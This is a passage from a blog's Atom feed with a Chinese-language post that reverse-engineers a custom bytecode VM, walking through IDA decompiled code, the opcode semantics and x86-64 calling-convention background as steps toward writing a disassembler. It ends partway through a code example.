<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pur3wh1tywhite</title>
  
  <subtitle>Better late than never</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://purewhitywhite.github.io/"/>
  <updated>2020-04-03T15:55:19.680Z</updated>
  <id>https://purewhitywhite.github.io/</id>
  
  <author>
    <name>pur3wh1tywhite</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>304challenge</title>
    <link href="https://purewhitywhite.github.io/2020-03-27/304challenge/"/>
    <id>https://purewhitywhite.github.io/2020-03-27/304challenge/</id>
    <published>2020-03-27T14:09:30.000Z</published>
    <updated>2020-04-03T15:55:19.680Z</updated>
    
    <content type="html"><![CDATA[<p>A survey of myvm &amp; disassembler &amp; more.</p><a id="more"></a><p>目标：</p><ul><li>对虚拟机进行分析，理解其指令格式，取址方式，了解指令用法；</li><li>基于对虚拟机的理解写出对应的反汇编器；</li><li>对给出程序进行分析，理解hello程序所做的所有事情。<br>初步理解：<code>myvw</code>对如何执行<code>hello</code>这个hex文件给出了解释执行的方法。静态分析<code>myvw</code>的运行方式确定其使用的指令集，并以之编写反汇编器，对<code>hello</code>进行反汇编，转换为用易于理解的助记符表示的汇编程序，从而理解其工作流程。<h1 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h1></li><li>通过myvm运行hello<center><img src="https://i.loli.net/2020/04/03/NZY3m4picq82buw.png"></center></li></ul><p>运行hello程序后会显示一行欢迎字符串，之后会要求输入一些数据，可以看到该程序的大致作用为将输入的数据回显出来，再输出一个换行。<br>下面尝试一下奇怪的输入试探程序的一些特殊处理：<br>键盘上的特殊键：<br><center><img src="https://i.loli.net/2020/04/03/1SLAnurKoce2GUg.png"></center></p><p>输入了键盘上的”↑’键，可以看到程序并没有返回之前的几个字符，而是直接返回A，且并没有换行处理。</p><ul><li>使用010Editor查看文件&amp;&amp;使用IDA直接反汇编文件<center><img src="https://i.loli.net/2020/04/03/KklbGBjvVDmp3sc.png"></center></li></ul><p>可以看到欢迎字符串存储在头部，不过对于这个未知的文件，指令与数据混杂在一起，无法确定代码和代码入口点的部分的位置，需要通过对<code>myvw</code>的分析来进一步确认。<br><center><img src="https://i.loli.net/2020/04/03/9hUxaCDp1Ws8Hqu.png"></center><br>用IDA打开之后随便找了几个地方按c，可以得到一些汇编指令，但具体看不太明白，应该还是要从虚拟机入手。</p><h1 id="myvw反编译分析"><a href="#myvw反编译分析" class="headerlink" title="myvw反编译分析"></a>myvw反编译分析</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __usercall main@&lt;rax&gt;(<span class="keyword">char</span> **a1@&lt;rsi&gt;, <span class="keyword">char</span> **a2@&lt;rdx&gt;, __int64 a3@&lt;rax&gt;, <span class="keyword">int</span> a4@&lt;edi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a4 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    signal(<span class="number">2</span>, (<span class="keyword">__sighandler_t</span>)handler);</span><br><span class="line">    v4 = (__int64 *)sub_CE0(a1[<span class="number">1</span>]);</span><br><span class="line">    unk_202014 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = sub_E90(v4);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !unk_202014 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Illegal Instruction"</span>);</span><br><span class="line">LABEL_8:</span><br><span class="line">    nullsub_1(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s &lt;myvm program&gt;\n"</span>, *a1, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>main</code>函数首先对输入虚拟机的参数进行了判断，保证用户正确的使用了输入；<br>随后的<code>signal</code>负责捕捉信号2（ctrl+c，即跳出信号），并交由<code>handler</code>进行处理；<a href="https://www.runoob.com/cprogramming/c-function-signal.html" target="_blank" rel="noopener">signal详解</a><br>随后调用<code>sub_CE0</code>，大致作用为给输入的文件分配内存的空间。<code>sub_CE0</code>的反编译结果如下：</p><h2 id="sub-CE0"><a href="#sub-CE0" class="headerlink" title="sub_CE0"></a>sub_CE0</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_CE0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v1; <span class="comment">// rax</span></span><br><span class="line">  FILE *v2; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v3; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v1 = fopen(a1, <span class="string">"rb"</span>);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  fseek(v1, <span class="number">0L</span>L, <span class="number">2</span>);</span><br><span class="line">  v3 = ftell(v2);</span><br><span class="line">  fseek(v2, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x10000</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x10000</span>uLL);</span><br><span class="line">  fread(v4, <span class="number">1u</span>LL, v3, v2);</span><br><span class="line">  fclose(v2);</span><br><span class="line">  _mm_storeu_si128(</span><br><span class="line">    (__m128i *)&amp;unk_202018 + <span class="number">4096</span>,</span><br><span class="line">    _mm_unpacklo_epi64((__m128i)(<span class="keyword">unsigned</span> __int64)&amp;unk_202018, (__m128i)((<span class="keyword">unsigned</span> __int64)&amp;unk_202018 + <span class="number">0x8000</span>)));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;unk_202018, v4, <span class="number">0x10000</span>uLL);</span><br><span class="line">  _mm_storeu_si128((__m128i *)&amp;unk_202018 + <span class="number">4097</span>, (__m128i)<span class="number">0L</span>L);</span><br><span class="line">  *(_QWORD *)((<span class="keyword">char</span> *)&amp;unk_202018 + <span class="number">65566</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *((_WORD *)&amp;unk_202018 + <span class="number">32785</span>) = <span class="number">32764</span>;</span><br><span class="line">  *((_QWORD *)&amp;unk_202018 + <span class="number">8197</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)&amp;unk_202018 + <span class="number">0x10000</span>;</span><br><span class="line">  <span class="built_in">free</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用<code>fopen</code>打开二进制文件，其中“rb”意为<em>文件必须存在，只允许读</em>，随后对返回值进行判断，若返回值为0则退出；</li><li>fseek(FILE *stream, long offset, int fromwhere);stream将指向以fromwhere为基准，偏移offset（指针偏移量）个字节的位置，函数返回0。如果执行失败(比如offset取值大于等于2*1024*1024*1024，即long的正数范围2G)，则不改变stream指向的位置，函数返回一个非0值。此处和下面<code>fseek</code>起到定位文件头和尾的作用；</li><li><code>ftell</code>将v2指向的位置与文件头的偏移返回给v3；</li><li><code>malloc</code>和<code>memset</code>完成内存的分配和初始化工作；</li><li><code>fread</code>将文件内容读到开辟的内存中去后<code>fclose</code>关闭文件流。<h3 id="SSE2"><a href="#SSE2" class="headerlink" title="SSE2"></a>SSE2</h3><blockquote><p>SSE2，全名为Streaming SIMD Extensions 2，是一种IA-32架构的SIMD（单一指令多重数据）指令集。SSE2是在 2001年随着Intel发表第一代Pentium 4处理器也一并推出的指令集。它延伸较早的SSE指令集，而且可以完全取代MMX指令集。在2004年，Intel 再度扩展了SSE2指令为 SSE3 指令集。与 70 条指令的 SSE 相比，SSE2新增了144条指令。<br>SSE2延伸了MMX指令群使用XMM寄存器来运算，这能让开发人员完全避免让8个64位MMX寄存器与原有的IA-32浮点运算寄存器共享。而这样子就能够不需要切换MMX与x87浮点运算的前提之下混合SIMD标量与浮点向量运算。不过，这不会因为 SSE 的寄存器的精度提高而让运算结果的精度也提高。<br>而还有部分的SSE2指令集包含了一系列的CPU缓存控制指令。当处理理论上无限的数据流，还有数字格式转换指令所产生出来的大量补码，能够使缓存污染有效的降低。</p></blockquote></li></ul><p>此处涉及到的两个<a href="https://blog.csdn.net/fengbingchun/article/details/18460199" target="_blank" rel="noopener">SSE指令</a>：</p><ul><li>void _mm_storeu_si128( m128i * p, m128i a) 可存储128位数据,将__m128i 变量a的值存储到p所指定的变量中去</li><li>_mm_unpacklo_epi64 (m128i a, m128i b) 返回一个m128i的寄存器，它将寄存器a和寄存器b的低64bit数以64bit为单位交织在一块<br>大致思想就是把读到的内容放在<code>unk_202018</code>指向的地址中去，然后将<code>unk_202018+0x10000</code>这个地址作为返回值返回。<br>回到主函数中来，看到在while循环中多次调用了函数<code>sub_E90</code>，直到该函数返回1的时候跳出循环，那么这一部分应该是语法分析阶段了。<h2 id="sub-E90"><a href="#sub-E90" class="headerlink" title="sub_E90"></a>sub_E90</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_E90</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// er14</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// r15</span></span><br><span class="line">  __int16 v8; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  __int16 v10; <span class="comment">// ax</span></span><br><span class="line">  __int16 v11; <span class="comment">// cx</span></span><br><span class="line">  __int16 v12; <span class="comment">// ax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int16 v14; <span class="comment">// ax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int16 v16; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v17; <span class="comment">// ax</span></span><br><span class="line">  __int16 v18; <span class="comment">// dx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 v19; <span class="comment">// ax</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// eax</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*((_DWORD *)a1 + <span class="number">11</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *a1;</span><br><span class="line">    v5 = a1[<span class="number">1</span>];</span><br><span class="line">    v6 = *((<span class="keyword">unsigned</span> __int16 *)a1 + <span class="number">15</span>);</span><br><span class="line">    v7 = (_BYTE *)(*a1 + v6);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v7 &gt;= v5 )</span><br><span class="line">LABEL_72:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    v8 = v6 + <span class="number">4</span>;</span><br><span class="line">    *((_WORD *)v1 + <span class="number">15</span>) = v6 + <span class="number">4</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="算术逻辑运算指令"><a href="#算术逻辑运算指令" class="headerlink" title="算术逻辑运算指令"></a>算术逻辑运算指令</h3><p>加、减、乘、除、取余、与、或、异或操作，每个操作的两种不同实现的区别在于前者是<code>*(v7[2]+8)</code>和<code>*(v7[3]+8)</code>运算，将结果放在<code>v1+v7[1]+8</code>处，而后者<code>*(v1+v7[1]+8)</code>和<code>__ROL2__(*((_WORD *)v7 + 1), 8)</code>参与运算，结果放在<code>v1+v7[1]+8</code>处。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">128</span>:</span><br><span class="line">        v11 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) + *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">129</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) += __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">130</span>:</span><br><span class="line">        v12 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) - *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">131</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) -= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">132</span>:</span><br><span class="line">        v11 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) * *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">133</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) *= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">134</span>:</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        v12 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) / *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_57;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">135</span>:</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) /= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">136</span>:</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>)</span><br><span class="line">                                                    % *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">137</span>:</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) %= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">138</span>:</span><br><span class="line">        v11 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) &amp; *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">139</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) &amp;= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">140</span>:</span><br><span class="line">        v11 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) | *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">141</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) |= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">142</span>:</span><br><span class="line">        v11 = *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">2</span>] + <span class="number">8</span>) ^ *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">3</span>] + <span class="number">8</span>);</span><br><span class="line">LABEL_25:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) = v11;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">143</span>:</span><br><span class="line">        *((_WORD *)v1 + (<span class="keyword">unsigned</span> __int8)v7[<span class="number">1</span>] + <span class="number">8</span>) ^= __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br></pre></td></tr></table></figure><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>case144到150分别为无条件跳转<code>JMP</code>,等于零则跳转<code>JZ</code>,不等于零则跳转<code>JNZ</code>,为负则跳转<code>JS</code>,不大于零则跳转<code>JNG</code>,大于零则跳转<code>JG</code>,不小于零则跳转<code>JNS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">144</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">145</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)v1 + <span class="number">10</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">146</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)v1 + <span class="number">10</span>) )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">147</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)v1 + <span class="number">10</span>) &lt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">148</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)v1 + <span class="number">10</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">149</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)v1 + <span class="number">10</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v2;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">150</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *((_DWORD *)v1 + <span class="number">10</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">LABEL_38:</span><br><span class="line">          *((_WORD *)v1 + <span class="number">15</span>) = __ROL2__(*((_WORD *)v7 + <span class="number">1</span>), <span class="number">8</span>) + v8;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br></pre></td></tr></table></figure><p>跳转地址经过一番操作后存入<code>[rbx+1eh]</code>，最终返回：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>000000000000114C                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">r15</span>+<span class="number">2</span>]     <span class="comment">; jumptable 0000000000000EF1 case 144</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001151</span>                 <span class="keyword">rol</span>     <span class="built_in">ax</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001155</span>                 <span class="keyword">add</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001157</span>                 <span class="keyword">mov</span>     [<span class="built_in">rbx</span>+<span class="number">1Eh</span>], <span class="built_in">di</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000115B                 <span class="keyword">jmp</span>     loc_EA6</span><br></pre></td></tr></table></figure><blockquote><p>case152再往后分析出现困难，补一补x64汇编的知识</p></blockquote><h1 id="Background-Knowledge"><a href="#Background-Knowledge" class="headerlink" title="Background Knowledge"></a>Background Knowledge</h1><h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>所有c标准库中可用的函数也可以在汇编语言程序中使用。以一种称为“调用约定”的标准方式调用，以便用多种语言编写的代码都可以链接在一起。<br>在x86 32位机器中。调用约定只是将每个参数入栈，然后调用该函数。被调用函数在栈中查找参数，完成它的工作之后，将结果存储到单个寄存器中。然后调用者弹出栈中的参数。<br>Linux上x86-64使用的调用约定有所不同，称之为System V ABI。完整的约定相当复杂，但以下是对我们来说足够简单的解释：</p><ul><li>整数参数（包括指针）按顺序放在寄存器％rdi，％rsi，％rdx，％rcx，％r8和％r9中。</li><li>浮点参数按顺序放置在寄存器％xmm0-％xmm7中。</li><li>超过可用寄存器的参数被压入栈。</li><li>如果函数使用可变数量的参数（如printf），那么必须将％eax寄存器设置为浮点参数的数量。</li><li>被调用的函数可以使用任何寄存器，但如果它们发生了变化，则必须恢复寄存器％rbx，％rbp，％rsp和％r12-％r15的值。</li><li>函数的返回值存储在％eax中。<br>总结：<center><img src="https://i.loli.net/2020/04/03/LprKIlnTyxt2fco.png"></center>每个函数都需要使用一系列寄存器来执行计算。然而，当一个函数被另一个函数调用时会发生什么？我们不希望调用者当前使用的任何寄存器被调用的函数破坏。为了防止这种情况发生，每个函数必须保存并恢复它使用的所有寄存器，方法是先将它们入栈，然后在返回之前将它们从堆栈弹出。在函数调用的过程中，栈基址指针%rbp始终指向当前函数调用开始时栈的位置，栈指针%rsp始终指向栈中最新的元素对应的位置。%rbp和%rsp之间的元素被我们成为"栈帧"，也叫"活动记录"。函数的调用过程其实就是栈帧被创建，扩张然后被销毁的过程。在说明函数调用流程前，我们不得不提到 %rip(instruction pointer) 指令指针寄存器。%rip中存放的是CPU需要执行的下一条指令的地址。每当执行完一条指令之后，这个寄存器会自动增加(可以这样理解)以便指向新的指令的地址。有了这些基础，接下来我们以一段完整的程序代码来解释函数的调用流程，有下面一段c代码：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 